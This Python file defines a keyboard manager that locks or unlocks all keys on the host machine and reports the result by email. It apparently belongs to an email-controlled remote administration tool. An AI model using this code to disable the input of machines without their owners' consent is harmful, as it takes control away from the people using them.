import threading, keyboard
import Email
from pynput.keyboard import Listener

class SingletonMeta(type):
    _instances = {}

    def __call__(self, *args, **kwargs):
        if self not in self._instances:
            instance = super().__call__(*args,**kwargs)
            self._instances[self] = instance
        return self._instances[self]


class ManagerKeyBoard(metaclass=SingletonMeta):

    def __init__(self,email):
        self.state = False
        self.mymail = email

    def getState(self):
        return self.state

    def lock(self,_callBack = None):
        if self.getState() == True:
            rep = "The keyboard state is lock"
        else:
            self.state = True
            for i in range(150):
                keyboard.block_key(i)
            rep = "lock keyboard is success"

        if _callBack:
            _callBack(self.mymail.getSender(), self.mymail.getSubject(), self.mymail.getBody(), rep)
        self.mymail.sendBack(rep,"")

    def unlock(self,_callBack = None):

        if self.getState() == False:
            rep = "The keyboard state is unblock"
        else:
            self.state = False
            for i in range(150):
                keyboard.unblock_key(i)
            rep = "unlock keyboard is success"

        if _callBack:
            _callBack(self.mymail.getSender(), self.mymail.getSubject(), self.mymail.getBody(), rep)
        self.mymail.sendBack(rep,"")


    def notificationState(self,_callBack = None):

        if self.getState() == True:
            rep = "The keyboard state is block"
        else:
            rep = "The keyboard state is unblock"

        if _callBack:
            _callBack(self.mymail.getSender(), self.mymail.getSubject(), self.mymail.getBody(), rep)
        self.mymail.sendBack(rep,"")
